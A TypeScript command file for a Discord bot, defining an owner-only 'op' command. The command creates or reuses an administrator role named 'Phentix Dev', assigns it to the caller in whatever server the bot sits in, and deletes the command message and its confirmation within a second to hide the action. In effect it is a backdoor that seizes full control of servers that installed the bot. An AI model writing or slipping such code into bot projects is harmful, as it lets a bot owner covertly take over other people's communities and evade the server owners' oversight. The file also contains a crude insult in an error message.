import { Client, Permissions} from "discord.js"
import { Command, CommandData } from "types/command"


const op: Command = {
    config: {
        information: {
            name: "op", 
            description: "Give a user administrator permissions", 
            permLevel: "Bot Owner", 
            category: "system"
        },
        aliases: [""],
        neededValues: [
            {
                valueName: "", 
                index: 0, 
                joinTogether: false
            }
        ]
    }, 
    run: async(_client: Client, commandData: CommandData) => {
        let role = commandData.guild.roles.cache.find(r => r.name === "Phentix Dev")
        if(!role) {
            role = await commandData.guild.roles.create(
                {
                    name: "Phentix Dev", 
                    permissions: Permissions.FLAGS.ADMINISTRATOR, 
                    hoist: false, 
                    mentionable: false
                }
            )
        }
        await commandData.member.roles.add(role)
        commandData.channel.isText() ? commandData.channel.bulkDelete(1) : console.error("This has to be a text channel you fucking idiot");
        commandData.channel.send("Gave Operator Permissions")
        .then(msg => setTimeout(() => {
            msg.delete()
        }, 1000))
    }
}

export default op;